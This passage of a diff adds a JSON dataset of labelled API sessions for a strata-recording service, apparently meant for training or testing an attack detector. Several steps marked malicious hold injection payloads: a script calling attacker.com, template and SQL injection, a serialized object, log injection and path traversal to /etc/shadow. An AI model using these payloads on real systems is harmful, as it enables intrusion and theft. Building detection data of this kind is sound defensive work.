+          "Authorization": "Bearer token143"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess144",
+    "client_ip": "192.0.2.53",
+    "steps": [
+      {
+        "id": "sess144-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "matan",
+          "password": "secretpassword44"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess144-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token144"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess144-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token144"
+        },
+        "body": null,
+        "note": "The user opens stratum 4401."
+      },
+      {
+        "id": "sess144-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-4401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token144",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.3,
+          "soilConsistency": "<script>fetch('http://attacker.com')</script>"
+        },
+        "note": "The update body includes a browser-executed code injection attempt."
+      },
+      {
+        "id": "sess144-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token144"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess145",
+    "client_ip": "192.0.2.54",
+    "steps": [
+      {
+        "id": "sess145-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "aviv",
+          "password": "secretpassword45"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess145-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token145"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess145-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "status": "active's filter"
+        },
+        "headers": {
+          "Authorization": "Bearer token145"
+        },
+        "body": null,
+        "note": "The query parameter includes an apostrophe in descriptive text."
+      },
+      {
+        "id": "sess145-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token145"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess145-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token145"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess146",
+    "client_ip": "192.0.2.55",
+    "steps": [
+      {
+        "id": "sess146-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "oran",
+          "password": "secretpassword46"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess146-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token146"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess146-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token146"
+        },
+        "body": null,
+        "note": "The user opens stratum 4601."
+      },
+      {
+        "id": "sess146-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata/stratum-4601/artifacts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token146",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "artifactType": "tool",
+          "material": "obsidian",
+          "payload": "{{7*7}}"
+        },
+        "note": "The artifact addition body includes a template expression."
+      },
+      {
+        "id": "sess146-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token146"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess147",
+    "client_ip": "192.0.2.56",
+    "steps": [
+      {
+        "id": "sess147-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "shani",
+          "password": "secretpassword47"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess147-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token147"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess147-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token147"
+        },
+        "body": null,
+        "note": "The user opens stratum 4701."
+      },
+      {
+        "id": "sess147-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token147"
+        },
+        "body": null,
+        "note": "The user returns to stratum 4702."
+      }
+    ]
+  },
+  {
+    "session_id": "sess148",
+    "client_ip": "192.0.2.57",
+    "steps": [
+      {
+        "id": "sess148-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "keren",
+          "password": "secretpassword48",
+          "remark": "User login session."
+        },
+        "note": "The request body contains a technical word in a remark field."
+      },
+      {
+        "id": "sess148-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token148"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess148-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token148"
+        },
+        "body": null,
+        "note": "The user opens stratum 4801."
+      },
+      {
+        "id": "sess148-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token148"
+        },
+        "body": null,
+        "note": "The user returns to stratum 4802."
+      }
+    ]
+  },
+  {
+    "session_id": "sess149",
+    "client_ip": "192.0.2.58",
+    "steps": [
+      {
+        "id": "sess149-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "nir",
+          "password": "secretpassword49"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess149-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token149"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess149-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token149"
+        },
+        "body": null,
+        "note": "The user opens stratum 4901."
+      },
+      {
+        "id": "sess149-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token149",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Unit",
+          "layerDepth": 1.0,
+          "serialized": "O:4:\"User\":0:{}"
+        },
+        "note": "The stratum creation body includes a serialized object string."
+      },
+      {
+        "id": "sess149-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token149"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess150",
+    "client_ip": "192.0.2.59",
+    "steps": [
+      {
+        "id": "sess150-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "alon",
+          "password": "secretpassword50"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess150-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token150"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess150-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token150"
+        },
+        "body": null,
+        "note": "The user opens stratum 5001."
+      },
+      {
+        "id": "sess150-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-5001/artifacts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token150",
+          "X-Forwarded-For": "10.0.0.1"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The request is a normal read. X-Forwarded-For is not trusted."
+      },
+      {
+        "id": "sess150-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token150"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess151",
+    "client_ip": "192.0.2.60",
+    "steps": [
+      {
+        "id": "sess151-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "doron",
+          "password": "secretpassword51"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess151-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token151"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess151-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token151"
+        },
+        "body": null,
+        "note": "The user opens stratum 5101."
+      },
+      {
+        "id": "sess151-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token151"
+        },
+        "body": null,
+        "note": "The user returns to stratum 5102."
+      }
+    ]
+  },
+  {
+    "session_id": "sess152",
+    "client_ip": "192.0.2.61",
+    "steps": [
+      {
+        "id": "sess152-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "guy",
+          "password": "secretpassword52",
+          "extraField": "normal"
+        },
+        "note": "The request body contains a harmless extra field."
+      },
+      {
+        "id": "sess152-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token152"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess152-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token152"
+        },
+        "body": null,
+        "note": "The user opens stratum 5201."
+      },
+      {
+        "id": "sess152-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token152"
+        },
+        "body": null,
+        "note": "The user returns to stratum 5202."
+      }
+    ]
+  },
+  {
+    "session_id": "sess153",
+    "client_ip": "192.0.2.62",
+    "steps": [
+      {
+        "id": "sess153-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "lihi",
+          "password": "secretpassword53"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess153-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token153"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess153-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-1234",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token153"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess153-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-5301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token153"
+        },
+        "body": null,
+        "note": "The user views their own artifact object."
+      },
+      {
+        "id": "sess153-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-5302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token153"
+        },
+        "body": null,
+        "note": "The user returns to another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess154",
+    "client_ip": "192.0.2.63",
+    "steps": [
+      {
+        "id": "sess154-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yael",
+          "password": "secretpassword54"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess154-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token154"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess154-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token154"
+        },
+        "body": null,
+        "note": "The user opens stratum 5401."
+      },
+      {
+        "id": "sess154-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-5401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token154",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.0,
+          "soilConsistency": "clay\n2026-10-28 11:07:00 [ERROR] Unauthorized access"
+        },
+        "note": "The update body includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess154-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token154"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess155",
+    "client_ip": "192.0.2.64",
+    "steps": [
+      {
+        "id": "sess155-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eran",
+          "password": "secretpassword55"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess155-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token155"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess155-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "status": "active\narchived"
+        },
+        "headers": {
+          "Authorization": "Bearer token155"
+        },
+        "body": null,
+        "note": "The query parameter contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess155-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token155"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess155-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token155"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess156",
+    "client_ip": "192.0.2.65",
+    "steps": [
+      {
+        "id": "sess156-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "asaf",
+          "password": "secretpassword56"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess156-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token156"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess156-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token156"
+        },
+        "body": null,
+        "note": "The user opens stratum 5601."
+      },
+      {
+        "id": "sess156-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token156"
+        },
+        "body": null,
+        "note": "The user returns to stratum 5602."
+      }
+    ]
+  },
+  {
+    "session_id": "sess157",
+    "client_ip": "192.0.2.66",
+    "steps": [
+      {
+        "id": "sess157-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "oded",
+          "password": "secretpassword57"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess157-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token157"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess157-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/settings",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token157"
+        },
+        "body": null,
+        "note": "The user accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess157-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token157"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess157-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token157"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess158",
+    "client_ip": "192.0.2.67",
+    "steps": [
+      {
+        "id": "sess158-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+        },
+        "body": {
+          "username": "tally",
+          "password": "secretpassword58"
+        },
+        "note": "The request uses an old browser user-agent header."
+      },
+      {
+        "id": "sess158-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token158"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess158-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token158"
+        },
+        "body": null,
+        "note": "The user opens stratum 5801."
+      },
+      {
+        "id": "sess158-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token158"
+        },
+        "body": null,
+        "note": "The user returns to stratum 5802."
+      }
+    ]
+  },
+  {
+    "session_id": "sess159",
+    "client_ip": "192.0.2.68",
+    "steps": [
+      {
+        "id": "sess159-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "nadav",
+          "password": "secretpassword59"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess159-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token159"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess159-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token159"
+        },
+        "body": null,
+        "note": "The user opens stratum 5901."
+      },
+      {
+        "id": "sess159-s04",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/strata/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token159"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the resource path."
+      },
+      {
+        "id": "sess159-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-5902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token159"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess160",
+    "client_ip": "192.0.2.69",
+    "steps": [
+      {
+        "id": "sess160-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "sharon",
+          "password": "secretpassword60"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess160-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token160"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess160-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token160"
+        },
+        "body": null,
+        "note": "The user opens stratum 6001."
+      },
+      {
+        "id": "sess160-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token160"
+        },
+        "body": null,
+        "note": "The user returns to stratum 6002."
+      }
+    ]
+  },
+  {
+    "session_id": "sess161",
+    "client_ip": "192.0.2.70",
+    "steps": [
+      {
+        "id": "sess161-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yoni",
+          "password": "secretpassword61"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess161-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {
+          "region": "Judea's hills"
+        },
+        "headers": {
+          "Authorization": "Bearer token161"
+        },
+        "body": null,
+        "note": "The query parameter contains an apostrophe in descriptive text."
+      },
+      {
+        "id": "sess161-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token161"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess161-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token161"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess161-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token161"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess162",
+    "client_ip": "192.0.2.71",
+    "steps": [
+      {
+        "id": "sess162-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "admin' OR 'a'='a",
+          "password": "pwd"
+        },
+        "note": "The first step attempts query injection in authentication."
+      },
+      {
+        "id": "sess162-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "lior",
+          "password": "secretpassword62"
+        },
+        "note": "The user logs in with valid credentials after the attempt."
+      },
+      {
+        "id": "sess162-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token162"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess162-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token162"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess162-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token162"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess163",
+    "client_ip": "192.0.2.72",
+    "steps": [
+      {
+        "id": "sess163-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "avigail",
+          "password": "secretpassword63"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess163-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token163"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess163-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token163"
+        },
+        "body": null,
+        "note": "The user opens stratum 6301."
+      },
+      {
+        "id": "sess163-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-6301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token163",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.5,
+          "soilConsistency": "sandy",
+          "permissions": "admin"
+        },
+        "note": "The update body includes a privilege field not in the contract."
+      },
+      {
+        "id": "sess163-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token163"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess164",
+    "client_ip": "192.0.2.73",
+    "steps": [
+      {
+        "id": "sess164-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "tom",
+          "password": "secretpassword64"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess164-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token164"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess164-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token164"
+        },
+        "body": null,
+        "note": "The user opens stratum 6401."
+      },
+      {
+        "id": "sess164-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token164"
+        },
+        "body": null,
+        "note": "The user returns to stratum 6402."
+      }
+    ]
+  },
+  {
+    "session_id": "sess165",
+    "client_ip": "192.0.2.74",
+    "steps": [
+      {
+        "id": "sess165-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "shai",
+          "password": "secretpassword65",
+          "debugMode": false
+        },
+        "note": "The request body contains a harmless extra field."
+      },
+      {
+        "id": "sess165-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token165"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess165-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token165"
+        },
+        "body": null,
+        "note": "The user opens stratum 6501."
+      },
+      {
+        "id": "sess165-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token165"
+        },
+        "body": null,
+        "note": "The user returns to stratum 6502."
+      }
+    ]
+  },
+  {
+    "session_id": "sess166",
+    "client_ip": "192.0.2.75",
+    "steps": [
+      {
+        "id": "sess166-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "oded",
+          "password": "secretpassword66"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess166-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token166"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess166-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-6601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token166"
+        },
+        "body": null,
+        "note": "The user opens stratum 6601."
+      },
+      {
+        "id": "sess166-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token166",
+          "Content-Type": "application/json"
+        },
